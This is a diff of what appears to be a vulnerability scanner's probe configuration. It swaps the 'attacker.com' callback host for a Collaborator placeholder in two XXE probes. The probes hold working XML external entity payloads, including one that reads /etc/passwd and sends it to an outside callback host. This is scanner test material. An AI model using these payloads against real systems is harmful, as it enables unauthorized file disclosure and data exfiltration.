@@ -57,11 +57,11 @@
       "probes": [
         {
           "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{{callback}}/xxe_test\">%xxe;]><foo>test</foo>",
-          "description": "Blind XXE OOB — external DTD callback",
+          "description": "Blind XXE OOB — external DTD callback (verify via Collaborator interaction)",
           "matchers": [{"type": "status", "status": [200, 500]}],
           "severity": "high",
           "confidence_boost": 30,
-          "variables": {"callback": "attacker.com"}
+          "variables": {"callback": "COLLABORATOR_URL"}
         }
       ]
     },
@@ -86,11 +86,11 @@
       "probes": [
         {
           "payload": "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY exfil SYSTEM 'http://{{callback}}/?data=%xxe;'>\">%eval;%exfil;]><foo>test</foo>",
-          "description": "Parameter entity chained exfiltration — reads /etc/passwd and sends to collaborator",
+          "description": "Parameter entity chained exfiltration — reads /etc/passwd and sends to Collaborator",
           "matchers": [{"type": "status", "status": [200, 400, 500]}],
           "severity": "critical",
           "confidence_boost": 45,
-          "variables": {"callback": "attacker.com"}
+          "variables": {"callback": "COLLABORATOR_URL"}
         }
       ]
     },
